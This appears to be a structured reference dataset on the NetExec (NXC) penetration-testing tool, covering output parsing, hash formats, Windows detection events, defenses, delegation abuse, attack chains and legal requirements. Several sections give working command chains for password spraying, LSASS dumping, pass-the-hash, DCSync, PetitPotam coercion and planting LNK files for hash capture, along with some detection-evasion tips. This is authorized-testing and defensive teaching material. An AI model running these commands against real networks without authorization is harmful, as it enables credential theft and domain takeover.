topics.title: NXC Output Format and Parsing
topics.content: Every NXC output line follows a consistent format: PROTOCOL IP PORT HOSTNAME [SYMBOL] MESSAGE. The protocol field is left-aligned (SMB, LDAP, WINRM, RDP, MSSQL, SSH, FTP, WMI, VNC). The IP address and port fields identify the target. The hostname shows the NetBIOS name. The symbol [*] is informational, [+] is success, [-] is failure. Key patterns to recognize when parsing pasted NXC output: authentication success looks like '[+] DOMAIN\user:password' or '[+] DOMAIN\user:hash', admin access adds '(Pwn3d!)', failures show '[-] DOMAIN\user:password STATUS_CODE'. Hash dump lines follow 'username:RID:LM_hash:NT_hash:::'. Share enumeration shows 'Share Permissions Remark' table format. The --verbose flag adds detail, --debug shows full technical debugging, and --log saves output to a file. Logs are stored at ~/.nxc/logs/ by default. Understanding these patterns is critical for automated parsing — grep for '(Pwn3d!)' to find admin access, grep for ':::' to extract hashes, grep for 'signing:False' to find relay targets. Status codes in failed auth lines (STATUS_LOGON_FAILURE, STATUS_ACCOUNT_LOCKED_OUT, STATUS_ACCOUNT_DISABLED, STATUS_PASSWORD_EXPIRED, STATUS_PASSWORD_MUST_CHANGE, STATUS_LOGON_TYPE_NOT_GRANTED) provide actionable intelligence about account states.

examples.command: SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)

topics.title: Hash Dump Output Formats
topics.content: NXC outputs credentials in several hash formats, each requiring different cracking approaches. SAM hash format: username:RID:LM_hash:NT_hash::: — the LM portion is usually aad3b435b51404eeaad3b435b51404ee (empty/disabled). The NT hash (32 hex chars) is used for PTH. NTDS hash format: same as SAM but may include DOMAIN\ prefix. Use hashcat mode 1000 for NT hashes. DCC2 format (from LSA dump): DOMAIN/user:$DCC2$10240#username#hash — Domain Cached Credentials v2, much slower to crack, use hashcat mode 2100. Kerberoast hash format: $krb5tgs$23$*username$DOMAIN$SPN*$hash — use hashcat mode 13100. AS-REP hash format: $krb5asrep$23$username@DOMAIN:hash — use hashcat mode 18200. NTLMv2 captured hashes (from Responder): username::DOMAIN:challenge:response — use hashcat mode 5600. For all hash types, the NT hash (32 hex characters) can be used directly for PTH without cracking. DCC2 hashes cannot be used for PTH — they must be cracked. Kerberoast and AS-REP hashes must be cracked — they are encrypted blobs, not authentication hashes. Understanding these formats is critical for knowing which hashes to crack vs. which to use directly.

examples.explanation: SAM dump hash — Administrator account (RID 500), empty LM hash, NT hash 5f4dcc3b5aa765d61d8327deb882cf99. Use NT hash directly for PTH.
examples.use_case: Parsing SAM dump output to extract hashes for pass-the-hash attacks

examples.explanation: Crack NT hashes (from SAM or NTDS dump) using hashcat mode 1000
examples.use_case: Cracking NTLM hashes to reveal plaintext passwords for reporting

examples.explanation: Crack Kerberoast TGS hashes using hashcat mode 13100 with mutation rules
examples.use_case: Cracking service account passwords obtained via Kerberoasting

examples.explanation: Crack DCC2 cached domain credentials — much slower than NTLM cracking

warnings: DCC2 hashes are ~100x slower to crack than NTLM
NT hashes can be used for PTH without cracking
Kerberoast and AS-REP hashes must be cracked — they can't be used for PTH
best_practices: Use NT hashes directly for PTH instead of cracking
Prioritize Kerberoast and AS-REP hashes for cracking — they may reveal reused passwords
Use rules with hashcat for better crack rates

topics.title: Windows Event IDs Generated by NXC
topics.content: Every NXC operation generates Windows Event Log entries that defenders can monitor. Authentication events: 4624 (successful logon, Type 3 for network logon via SMB/WinRM, Type 10 for RDP), 4625 (failed logon — multiple from one source indicates spray/brute), 4648 (explicit credential logon when different creds are used), 4776 (NTLM authentication on the DC — shows every NTLM auth in the domain). Kerberos events: 4768 (TGT request — encryption type 0x17/RC4 may indicate PTH), 4769 (service ticket request — bulk requests indicate Kerberoasting). Execution events: 7045 (new service installed — smbexec creates a service with random name, very detectable), 5145 (network share access — ADMIN$ and C$ access is suspicious from non-admin sources), 4698/4699 (scheduled task created/deleted — atexec pattern). DCSync detection: 4662 with replication GUIDs 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All) from a non-DC source. LSASS access: Sysmon Event 10 with TargetImage lsass.exe and high access rights (0x1FFFFF). Password spraying signature: multiple 4625 from same source IP against different accounts within a short timeframe. Lateral movement signature: sequential 4624 Type 3 across multiple hosts from one source.

examples.command: Event ID 4625 with STATUS_LOGON_FAILURE from source 10.10.10.5 against 50 different accounts
examples.explanation: Classic password spraying signature — multiple failed logons from one source against many accounts
examples.use_case: SIEM correlation rule: >5 failed logins from same source within 5 minutes against >3 unique accounts

examples.explanation: smbexec service creation — random service name with cmd.exe command execution pattern
examples.use_case: Detecting NXC smbexec command execution method

examples.explanation: DCSync attack — replication request from a non-domain-controller is highly suspicious
examples.use_case: Detecting NXC --ntds (DCSync) credential extraction

examples.command: Sysmon Event 10: SourceImage powershell.exe accessing TargetImage lsass.exe with GrantedAccess 0x1FFFFF
examples.explanation: LSASS process access — indicates credential dumping attempt via lsassy or similar
examples.use_case: Detecting NXC lsassy/mimikatz/procdump module execution

warnings: smbexec is the noisiest execution method — creates Event 7045
DCSync is detectable but requires proper auditing to be configured
Default Windows auditing may not capture all events — advanced audit policies are needed
best_practices: Prefer wmiexec over smbexec to avoid Event 7045
Use Kerberos (-k) instead of NTLM to avoid Event 4776
Minimize subnet sweeps to reduce the volume of 4624/4625 events

topics.title: Defensive Countermeasures
topics.content: Comprehensive defenses against NXC attacks span authentication, endpoint, network, and monitoring layers. Against password spraying: implement account lockout policies (5-10 threshold), smart lockout (Azure AD), MFA for all accounts, fine-grained password policies for service accounts, and SIEM alerting on >5 failures from same source. Against pass-the-hash: enable Credential Guard to isolate NTLM hashes, add sensitive accounts to Protected Users group (prevents NTLM), implement admin tiering (T0/T1/T2), deploy LAPS (Local Administrator Password Solution) to prevent local admin password reuse, and consider disabling NTLM where possible. Against lateral movement: network segmentation blocking workstation-to-workstation SMB, Windows Firewall blocking inbound port 445 on workstations, JEA (Just Enough Administration) for WinRM, and admin tiering so T2 admins can't access servers. Against credential dumping: enable RunAsPPL (LSA Protection) to protect LSASS, Credential Guard to prevent cleartext storage, disable WDigest, deploy Sysmon with LSASS access rules, and modern EDR. Against DCSync: restrict 'Replicating Directory Changes' permissions, audit Event 4662, alert on replication from non-DC IPs. Against NTLM relay: enable SMB signing on ALL hosts (not just DCs), enable LDAP signing and channel binding, EPA for web services. Each defense adds a layer — defense in depth is critical because no single control stops all NXC capabilities.

examples.command: Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > 'Microsoft network server: Digitally sign communications (always)' = Enabled
examples.explanation: Enable SMB signing on all hosts to prevent NTLM relay attacks — NXC's --gen-relay-list will return empty results
examples.use_case: Mitigating NTLM relay attacks by enforcing SMB signing domain-wide

examples.explanation: Enable LSA Protection (RunAsPPL) to protect LSASS from credential dumping — requires reboot
examples.use_case: Protecting LSASS from NXC's lsassy, mimikatz, and procdump modules

examples.explanation: Add the administrator account to the Protected Users group to prevent NTLM authentication
examples.use_case: Preventing pass-the-hash attacks against domain admin accounts

examples.command: Install LAPS: deploy Local Administrator Password Solution to automatically rotate unique local admin passwords on each workstation
examples.explanation: LAPS ensures each workstation has a unique, randomly generated local admin password — eliminates password reuse
examples.use_case: Preventing local admin hash reuse attacks across workstations

warnings: Credential Guard requires hardware support (TPM, UEFI)
RunAsPPL may break some legitimate applications
Disabling NTLM may break legacy applications
best_practices: Defense in depth — implement multiple layers
Priority: LAPS, SMB signing, Credential Guard, RunAsPPL
Monitor Event IDs 4625, 7045, 4662, and Sysmon 10
Test defenses in lab before deploying to production

topics.title: Delegation Abuse
topics.content: Active Directory delegation allows services to act on behalf of users. Misconfigured delegation is a critical attack vector. Unconstrained delegation (TRUSTED_FOR_DELEGATION flag) allows a service to impersonate any user to any service. Find these with 'nxc ldap dc -u user -p pass --trusted-for-delegation'. Attack: compromise the unconstrained delegation host, coerce a DA or DC to authenticate (PetitPotam, PrinterBug), capture the TGT from memory, use PTT for domain admin. Constrained delegation (msds-allowedtodelegateto) limits which services can be accessed, but through S4U2Self and S4U2Proxy protocol extensions, an attacker with the service account credentials can request tickets for any user to the allowed services. Alternative service names can be substituted (e.g., CIFS ticket can be changed to LDAP for DCSync). Resource-Based Constrained Delegation (RBCD) allows writing to msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object to configure delegation from an attacker-controlled computer. Requirements: GenericWrite, GenericAll, or WriteDacl on the target computer object + ability to create a computer account (default: any domain user can create up to 10). NXC facilitates the enumeration phase — finding delegation configurations — while the exploitation typically uses Rubeus, getST.py, or similar Kerberos tools.

examples.explanation: Find all accounts with unconstrained delegation — these are high-value targets for privilege escalation via TGT capture
examples.use_case: Identifying delegation abuse opportunities during AD enumeration

examples.command: nxc smb 192.168.1.30 -u administrator -p 'Password123' -x 'whoami' && nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=192.168.1.30
examples.explanation: Step 1: Verify admin on unconstrained delegation host. Step 2: Coerce DC to authenticate to it for TGT capture.
examples.use_case: Full unconstrained delegation attack chain — from compromise to DC TGT capture

warnings: Unconstrained delegation on a DC is by design — focus on non-DC hosts
RBCD requires write access to computer objects
Delegation abuse is a complex multi-step attack — test in lab first
best_practices: Always enumerate delegation during AD assessments
Report unconstrained delegation on any non-DC host as HIGH severity
Use PetitPotam or PrinterBug for coercion in delegation attacks

topics.title: Full Attack Chains with NXC
topics.content: NXC enables complete attack chains from initial network access to domain compromise. Chain 1 — Discovery to DA via spray: nxc smb subnet (discover hosts, signing), nxc smb dc --gen-relay-list (identify relay targets), nxc smb dc -u '' -p '' --users/--rid-brute (enumerate users), nxc smb dc -u users.txt -p 'Season2024!' --continue-on-success (spray), nxc smb subnet -u found_user -p pass (check access), nxc smb pwned_host -u user -p pass --sam/--lsa/-M lsassy (dump creds), nxc smb subnet -u admin -H hash (PTH), nxc smb dc -u da -H hash --ntds (DCSync). Chain 2 — Null session to DA: nxc smb dc -u '' -p '' --rid-brute (enumerate users), nxc ldap dc -u users.txt -p '' --asreproast (AS-REP roast), hashcat -m 18200 (crack), nxc smb subnet -u cracked_user -p pass (check access), nxc ldap dc -u user -p pass --kerberoasting (Kerberoast), hashcat -m 13100 (crack), escalate with service account. Chain 3 — Relay to shell: nxc smb subnet --gen-relay-list (find targets), ntlmrelayx -tf targets.txt, Responder or PetitPotam for coercion, shell on relay target, dump creds, escalate. Each chain shows how NXC commands build upon each other, with each step's output feeding the next step's input. The key insight is that NXC is most powerful when used systematically across multiple phases, not as isolated commands.

examples.command: nxc smb 10.10.10.0/24 && nxc smb 10.10.10.0/24 --gen-relay-list relay.txt && nxc smb 10.10.10.5 -u '' -p '' --rid-brute && nxc smb 10.10.10.5 -u users.txt -p 'Company2024!' --continue-on-success
examples.explanation: Complete Phase 1 of an internal pentest: discover hosts, generate relay list, enumerate users, spray credentials
examples.use_case: Systematic initial access methodology using NXC

examples.command: nxc smb 10.10.10.20 -u found_user -p 'Company2024!' -M lsassy && nxc smb 10.10.10.0/24 -u da_user -H captured_hash --ntds
examples.explanation: Dump LSASS on a compromised host to find DA credentials, then DCSync the entire domain
examples.use_case: Post-exploitation credential chaining to domain compromise

warnings: Each chain generates multiple detection events — space operations over time for OPSEC
Spray against DC only, not entire subnet
Verify scope authorization before DCSync
best_practices: Follow a systematic methodology — don't skip steps
Spray against DC to minimize event volume
Document each step with timestamps for the report
Use nxcdb to track all findings across the chain

topics.title: CME to NXC Migration and Common Troubleshooting
topics.content: Migrating from CrackMapExec to NetExec is straightforward — replace 'crackmapexec' or 'cme' with 'nxc'. The config directory changed from ~/.cme/ to ~/.nxc/, and the database command from 'cmedb' to 'nxcdb'. Most flags are identical. New NXC features not in CME: additional protocols (RDP, FTP, VNC, WMI), improved modules, better error handling. Common troubleshooting: Connection timeout — increase with --timeout 30, check network connectivity, verify the port is open. Module not found — run 'nxc smb -L' to list available modules, update with 'pipx upgrade netexec'. Hash format errors — use 32 hex chars for NT hash or 'aad3b435b51404eeaad3b435b51404ee:NT_HASH' for LM:NT format. Kerberos failures — use hostname not IP, check /etc/krb5.conf, sync time with DC (ntpdate dc), verify DNS resolution. Common mistakes: forgetting --continue-on-success (missing valid accounts during spray), forgetting --local-auth for SAM-derived credentials, spraying against all hosts instead of just the DC (4625 events on every host), not checking password policy before spraying (account lockouts), using IP instead of hostname for Kerberos. DNS issues: add DC as nameserver or add /etc/hosts entries for domain resolution.

examples.use_case: Diagnosing connection failures or slow responses

examples.use_case: Fixing Kerberos authentication failures caused by DNS resolution issues

best_practices: When migrating from CME, just replace the binary name
Use --debug for troubleshooting
Keep NXC updated with pipx upgrade netexec

topics.title: Beginner Practical Scenarios
topics.content: Beginner scenarios cover the first steps on an internal penetration test. Scenario 1 — First network scan: Run 'nxc smb 192.168.1.0/24' to discover hosts, OS versions, domains, and signing status. This single command reveals the network landscape without authentication. Look for: DCs (signing:True), relay targets (signing:False), old OS versions (potential vulns). Scenario 2 — Found credentials (sticky note, phishing, etc.): First validate them: 'nxc smb dc -u user -p pass'. If valid: enumerate everything (--users, --groups, --shares, --pass-pol, --sessions). Check admin access across the network: 'nxc smb subnet -u user -p pass'. Check other protocols too (winrm, rdp, mssql). Scenario 3 — Null session enumeration: Try 'nxc smb dc -u '' -p '' --shares --users --rid-brute' — on misconfigured DCs, null sessions may allow extensive enumeration without credentials. Key beginner principles: always start with unauthenticated scanning, try null/guest access before anything else, enumerate password policy before spraying, check all protocols when you have credentials, save user lists for spraying.

examples.use_case: Initial network reconnaissance on an internal engagement

examples.explanation: Validate found credentials against the DC, then check admin access across the network

best_practices: Start with unauthenticated scanning
Try null and guest sessions first

topics.title: Advanced Practical Scenarios
topics.content: Advanced scenarios demonstrate multi-step attack chains. Scenario — Credential chaining to DA: Start with low-priv user, find writable shares (--shares grep WRITE), place SCF/LNK files for hash capture (slinky module), capture hash via Responder, crack NTLMv2 hash (hashcat -m 5600), check new credentials' access (nxc smb subnet -u cracked -p pass), dump LSASS on Pwn3d hosts (-M lsassy), find DA hash, PTH to DC (nxc smb dc -u da -H hash), DCSync (--ntds). This chain shows how a standard domain user can achieve DA through systematic exploitation. Each step's output directly feeds the next. Other advanced patterns: MSSQL exploitation (find SQL servers, check default sa, xp_cmdshell for OS access, hash stealing via xp_dirtree, linked server pivoting), network segmentation bypass (use a dual-homed host as a pivot, set up SOCKS proxy, run NXC through proxy), and trust exploitation (enumerate trusts via LDAP, authenticate across trust boundaries, SID history abuse for cross-domain escalation). In all scenarios, nxcdb tracks all findings automatically.

examples.command: nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M slinky -o SERVER=10.10.10.5 NAME=Q4_Budget
examples.explanation: Place a malicious LNK file on a writable share to capture NTLM hashes when users browse the share
examples.use_case: Hash capture via writable share — part of credential chaining attack

examples.command: nxc smb 192.168.1.20 -u admin.jones -p 'CrackedPass!' -M lsassy && nxc smb 192.168.1.10 -u da_admin -H '<captured_hash>' --ntds
examples.explanation: Dump LSASS on a compromised workstation to find DA credentials, then DCSync the domain
examples.use_case: Final steps of credential chaining — achieving full domain compromise

warnings: Multi-step attacks generate many events — coordinate with rules of engagement
Always verify scope before DCSync
Clean up artifacts (uploaded files, LNK files) after engagement
best_practices: Document every step with timestamps
Use nxcdb to track all credentials and access
Clean up artifacts after each phase

topics.title: Legal and Ethical Considerations
topics.content: NXC is a dual-use tool — legitimate for authorized security testing, illegal for unauthorized access. Legal requirements: always have written authorization (rules of engagement, statement of work, or penetration test agreement) before running NXC against any network. The scope must clearly define which hosts, protocols, and techniques are permitted. Password spraying, credential dumping, and lateral movement should be explicitly authorized. Operating without authorization violates computer crime laws such as the CFAA (Computer Fraud and Abuse Act) in the US, CMA (Computer Misuse Act) in the UK, and equivalent laws globally. Best practices: notify the client's SOC/blue team if required by the engagement rules, document all activities with timestamps for the final report, report critical findings (Zerologon, default SA passwords) immediately without waiting for the final report, verify with the client before full NTDS dump to ensure it's within scope, protect all extracted credentials (encrypt data, wipe after engagement), coordinate spray timing with the client to avoid production impact, if you lock out accounts notify the client immediately and document which accounts were affected. Data handling: extracted credentials must be handled according to the engagement's data handling agreement, typically encrypted at rest and securely deleted after the engagement report is delivered.

examples.explanation: Written authorization is a legal requirement before using NXC against any network or system

warnings: Unauthorized use of NXC is a criminal offense
Always stay within the defined scope
Handle extracted credentials securely
best_practices: Always have written authorization
Report critical findings immediately
Coordinate with client SOC when required
Encrypt and securely delete all engagement data
